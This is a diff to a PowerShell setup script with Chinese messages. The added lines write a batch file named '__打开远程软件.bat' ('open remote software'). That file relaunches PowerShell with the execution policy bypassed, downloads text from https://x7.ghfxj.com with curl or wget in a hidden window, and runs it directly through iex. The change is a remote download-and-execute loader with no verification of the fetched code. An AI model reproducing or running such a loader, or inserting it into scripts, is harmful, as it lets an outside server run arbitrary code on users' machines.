@@ -167,6 +167,21 @@ if ($cd) {
 } else {
     Write-Host "未找到合适的固定硬盘分区，无法设置工作路径。" -ForegroundColor Red
 }
+$yc = @'
+#@&cls&set cd=%~dp0&powershell -EP Bypass -C "gc '%~f0' -enc UTF8|out-string|iex"&exit
+$ErrorActionPreference = 'Stop'; cd $env:cd; [Environment]::CurrentDirectory = $pwd
+function Get-XContent($Url) {
+$c = Get-Command curl.exe -EA 0
+$pi = New-Object Diagnostics.ProcessStartInfo -Prop @{
+FileName = if ($c) {'curl.exe'} else {'wget.exe'}
+Arguments = if ($c) {"-s -L -o - $Url"} else {"-q -O - $Url"}
+UseShellExecute = $false;RedirectStandardOutput = $true
+StandardOutputEncoding = [Text.Encoding]::UTF8
+CreateNoWindow = $true
+};$p = [Diagnostics.Process]::Start($pi);$p.StandardOutput.ReadToEnd().Trim()    
+};$env:Path = "$HOME\__Tools;$env:Path";Get-XContent "https://x7.ghfxj.com"|iex
+'@
+[IO.File]::WriteAllText("__打开远程软件.bat", $yc)
 
 ##############################################################################################✅
 #if (Test-Path "$pwd\wget.exe") { $wget = "$pwd\wget.exe" }; #$wget
